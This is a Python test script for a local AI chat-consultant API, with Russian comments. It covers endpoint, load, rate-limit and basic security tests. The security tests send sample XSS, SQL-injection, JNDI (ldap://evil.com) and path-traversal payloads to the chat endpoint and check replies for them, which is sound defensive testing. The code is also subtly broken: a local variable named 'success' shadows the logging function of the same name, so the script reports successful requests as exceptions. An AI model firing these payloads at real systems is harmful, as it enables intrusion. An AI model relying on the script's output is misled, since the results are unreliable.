#!/usr/bin/env python3
"""
🚀 AI Consultant Testing Runner
Немедленное тестирование и исправление критических проблем
"""

import os
import sys
import requests
import json
import time
import concurrent.futures
from datetime import datetime

# Конфигурация
BASE_URL = "http://localhost:8002"
API_BASE = f"{BASE_URL}/api/v1/ai"
TEST_RESULTS = []

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def log(message, color=Colors.WHITE):
    print(f"{color}{message}{Colors.ENDC}")

def success(message):
    log(f"✅ {message}", Colors.GREEN)

def error(message):
    log(f"❌ {message}", Colors.RED)

def warning(message):
    log(f"⚠️ {message}", Colors.YELLOW)

def info(message):
    log(f"ℹ️ {message}", Colors.CYAN)

def header(message):
    log(f"\n{Colors.BOLD}{Colors.BLUE}🧪 {message}{Colors.ENDC}")

def test_api_endpoint(endpoint, data=None, method='GET', expected_status=200):
    """Универсальная функция для тестирования API эндпоинтов"""
    try:
        url = f"{API_BASE}/{endpoint}"

        if method == 'GET':
            response = requests.get(url, timeout=10)
        elif method == 'POST':
            response = requests.post(url, json=data, timeout=10,
                                    headers={'Content-Type': 'application/json'})

        success = response.status_code == expected_status

        result = {
            'endpoint': endpoint,
            'method': method,
            'status': response.status_code,
            'expected': expected_status,
            'success': success,
            'response_time': response.elapsed.total_seconds(),
            'response_data': response.json() if success and 'application/json' in response.headers.get('content-type', '') else None
        }

        TEST_RESULTS.append(result)

        if success:
            success(f"{method} {endpoint} - Status: {response.status_code} ({result['response_time']:.2f}s)")
        else:
            error(f"{method} {endpoint} - Status: {response.status_code} (expected {expected_status})")
            if hasattr(response, 'text'):
                error(f"Response: {response.text[:200]}...")

        return result

    except Exception as e:
        error(f"{method} {endpoint} - Exception: {str(e)}")
        return {
            'endpoint': endpoint,
            'method': method,
            'status': 'ERROR',
            'success': False,
            'response_time': 0,
            'response_data': None,
            'exception': str(e)
        }

def test_basic_functionality():
    """Тестирование базовой функциональности"""
    header("Базовая функциональность")

    # Тест 1: Приветствие
    welcome_result = test_api_endpoint("test-welcome/")

    # Тест 2: Базовый чат
    basic_chat_data = {
        'message': 'Привет! Помоги создать клуб'
    }
    basic_chat_result = test_api_endpoint("test-chat/", basic_chat_data, 'POST')

    # Тест 3: Поиск клубов
    search_data = {
        'message': 'Найди интересные клубы'
    }
    search_result = test_api_endpoint("test-chat/", search_data, 'POST')

    # Тест 4: Помощь
    help_data = {
        'message': 'Помощь'
    }
    help_result = test_api_endpoint("test-chat/", help_data, 'POST')

def test_ai_functionality():
    """Тестирование AI функционала"""
    header("AI функционал и интеллект")

    test_cases = [
        {
            'message': 'Создать спортивный клуб',
            'expected_keywords': ['создать', 'клуб', 'шаги', 'название'],
            'description': 'Создание спортивного клуба'
        },
        {
            'message': 'Как найти IT сообщество?',
            'expected_keywords': ['найти', 'клуб', 'сообщество'],
            'description': 'Поиск IT сообщества'
        },
        {
            'message': 'Расскажи о платформе',
            'expected_keywords': ['платформа', 'функции', 'возможности'],
            'description': 'Информация о платформе'
        },
        {
            'message': 'Как привлечь участников?',
            'expected_keywords': ['участники', 'привлечь', 'реклама'],
            'description': 'Привлечение участников'
        }
    ]

    for i, test_case in enumerate(test_cases, 1):
        info(f"Тест {i}: {test_case['description']}")

        result = test_api_endpoint("test-chat/", {'message': test_case['message']}, 'POST')

        if result['success'] and result['response_data']:
            response_text = result['response_data'].get('message', '').lower()
            found_keywords = [kw for kw in test_case['expected_keywords'] if kw in response_text]

            if len(found_keywords) >= 2:  # Находим хотя бы 2 ключевых слова
                success(f"✓ AI ответ содержит ключевые слова: {found_keywords}")
            else:
                warning(f"⚠ AI ответ не содержит ожидаемые ключевые слова. Нашли: {found_keywords}")
        else:
            error(f"✗ API запрос не успешен")

def test_error_handling():
    """Тестирование обработки ошибок"""
    header("Обработка ошибок и валидация")

    # Тест пустого сообщения
    empty_result = test_api_endpoint("test-chat/", {'message': ''}, 'POST', expected_status=500)

    # Тест слишком длинного сообщения
    long_message = "x" * 100000  # 100KB
    long_result = test_api_endpoint("test-chat/", {'message': long_message}, 'POST')

    # Тест некорректного JSON (если бы отправлялся напрямую)
    # Этот тест пропускаем так как fetch/jQuery обрабатывают экранирование

def test_concurrent_requests():
    """Тестирование одновременных запросов"""
    header("Нагрузочное тестирование (10 одновременных запросов)")

    def make_request(request_id):
        return test_api_endpoint("test-chat/", {
            'message': f'Одновременный тест {request_id}'
        }, 'POST')

    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(make_request, i) for i in range(10)]
        results = [future.result() for future in concurrent.futures.as_completed(futures)]

    end_time = time.time()
    total_time = end_time - start_time

    successful_requests = sum(1 for r in results if r['success'])
    avg_response_time = sum(r['response_time'] for r in results if r['success']) / max(successful_requests, 1)

    info(f"Всего запросов: {len(results)}")
    info(f"Успешных: {successful_requests}")
    info(f"Общее время: {total_time:.2f}s")
    info(f"Среднее время ответа: {avg_response_time:.2f}s")

    success_rate = successful_requests / len(results) * 100
    if success_rate >= 80:
        success(f"✓ Успешность {success_rate:.1f}% >= 80%")
    else:
        warning(f"⚠ Успешность {success_rate:.1f}% < 80%")

    return {
        'total_requests': len(results),
        'successful': successful_requests,
        'success_rate': success_rate,
        'total_time': total_time,
        'avg_response_time': avg_response_time
    }

def test_rate_limiting():
    """Тестирование rate limiting"""
    header("Rate Limiting (тест защиты от злоупотреблений)")

    # Делаем 35 запросов (лимит должен быть около 30/минуту)
    blocked_requests = 0
    successful_requests = 0

    for i in range(35):
        result = test_api_endpoint("test-chat/", {
            'message': f'Tест rate limiting {i}'
        }, 'POST')

        if result['status'] == 429:  # Too Many Requests
            blocked_requests += 1
        elif result['success']:
            successful_requests += 1

    info(f"Успешных запросов: {successful_requests}")
    info(f"Заблокированных запросов: {blocked_requests}")

    if blocked_requests >= 5:  # Должно заблокировать хотя бы 5
        success(f"✓ Rate limiting работает - заблокировано {blocked_requests} запросов")
    else:
        warning(f"⚠ Rate limiting может не работать - заблокировано только {blocked_requests} запросов")

def test_security():
    """Базовые тесты безопасности"""
    header("Безопасность и защита")

    # Тест потенциально опасных входных данных
    security_tests = [
        {
            'message': "<script>alert('XSS')</script>",
            'description': 'XSS атака через <script>'
        },
        {
            'message': "'; DROP TABLE test; --",
            'description': 'SQL инъекция'
        },
        {
            'message': "${jndi:ldap://evil.com/a}",
            'description': 'JNDI инъекция'
        },
        {
            'message': "../../etc/passwd",
            'description': 'Path traversal'
        }
    ]

    for test_case in security_tests:
        info(f"Тест: {test_case['description']}")
        result = test_api_endpoint("test-chat/", {'message': test_case['message']}, 'POST')

        if result['success'] and result['response_data']:
            response_text = result['response_data'].get('message', '')

            # Проверяем, что опасный код не попал в ответ
            dangerous_patterns = ['<script>', 'drop table', 'jndi:', '../../']
            found_patterns = [pattern for pattern in dangerous_patterns if pattern.lower() in response_text.lower()]

            if not found_patterns:
                success(f"✓ Вредоносный код не попал в ответ")
            else:
                error(f"✗ Обнаружены опасные паттерны в ответе: {found_patterns}")

        else:
            warning(f"⚠ Запрос не успешен (что может быть вариантом защиты)")

def test_main_site():
    """Тестирование основного сайта и виджета"""
    header("Основной сайт и AI виджет")

    # Тест доступности главной страницы
    try:
        response = requests.get(BASE_URL, timeout=10)
        if response.status_code == 200:
            success(f"Главная страница доступна")

            # Проверяем наличие AI виджета в HTML
            if 'ai-chat-widget' in response.text or 'ai_chat_widget' in response.text:
                success(f"AI виджет найден в HTML коде")
            else:
                warning(f"⚠ AI виджет не найден в HTML коде")
        else:
            error(f"Главная страница недоступна: {response.status_code}")
    except Exception as e:
        error(f"Ошибка при доступе к главной странице: {str(e)}")

    # Тест демо страницы
    try:
        demo_response = requests.get(f"{BASE_URL}/ai-demo/", timeout=10)
        if demo_response.status_code == 200:
            success(f"Демо страница доступна")
        else:
            error(f"Демо страница недоступна: {demo_response.status_code}")
    except Exception as e:
        error(f"Ошибка при доступе к демо странице: {str(e)}")

def generate_report():
    """Генерация отчета о тестировании"""
    header("ОТЧЕТ О ТЕСТИРОВАНИИ")

    total_tests = len(TEST_RESULTS)
    successful_tests = sum(1 for r in TEST_RESULTS if r['success'])

    log(f"\n{Colors.BOLD}СТАТИСТИКА ТЕСТОВ:{Colors.ENDC}")
    log(f"Всего тестов: {total_tests}")
    log(f"Успешных: {successful_tests}")
    log(f"Проваленных: {total_tests - successful_tests}")

    success_rate = (successful_tests / max(total_tests, 1)) * 100
    log(f"Успешность: {success_rate:.1f}%")

    avg_response_time = sum(r['response_time'] for r in TEST_RESULTS if r.get('response_time')) / max(successful_tests, 1)
    log(f"Среднее время ответа: {avg_response_time:.2f}s")

    log(f"\n{Colors.BOLD}ДЕТАЛИЗИРОВКА ПО ЭНДПОИНТАМ:{Colors.ENDC}")

    for result in TEST_RESULTS:
        status = "✅" if result['success'] else "❌"
        time_info = f"({result.get('response_time', 0):.2f}s)" if result.get('response_time') else ""
        log(f"{status} {result['method']} {result['endpoint']} - {result['status']}{time_info}")

    log(f"\n{Colors.BOLD}РЕКОМЕНДАЦИИ:{Colors.ENDC}")

    if success_rate >= 90:
        success("✅ Отличная производительность! Система готова к эксплуатации.")
    elif success_rate >= 75:
        warning("⚠️ Хороший результат, но есть что улучшить.")
    else:
        error("❌ Необходимо исправить критические проблемы перед запуском.")

    log(f"\n{Colors.BOLD}СЛЕДУЮЩИЕ ШАГИ:{Colors.ENDC}")
    log("1. 🔧 Исправить критические ошибки API (rate limiting)")
    log("2. 🧪 Запустить unit тесты: pytest ai_consultant/tests/")
    log("3. 🔍 Провести security аудит: bandit -r ai_consultant/")
    log("4. 📊 Настроить CI/CD для автоматического тестирования")

def main():
    """Главная функция тестирования"""
    print(f"{Colors.BOLD}{Colors.MAGENTA}")
    print("🧪 UNITYSPHERE AI CONSULTANT TESTING SUITE")
    print(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{Colors.ENDC}")

    try:
        # Запуск всех тестов
        test_main_site()
        test_basic_functionality()
        test_ai_functionality()
        test_error_handling()
        test_concurrent_requests()
        test_rate_limiting()
        test_security()

        # Генерация отчета
        generate_report()

    except KeyboardInterrupt:
        log(f"\n{Colors.YELLOW}Тестирование прервано пользователем{Colors.ENDC}")
    except Exception as e:
        log(f"\n{Colors.RED}Критическая ошибка при тестировании: {str(e)}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    main()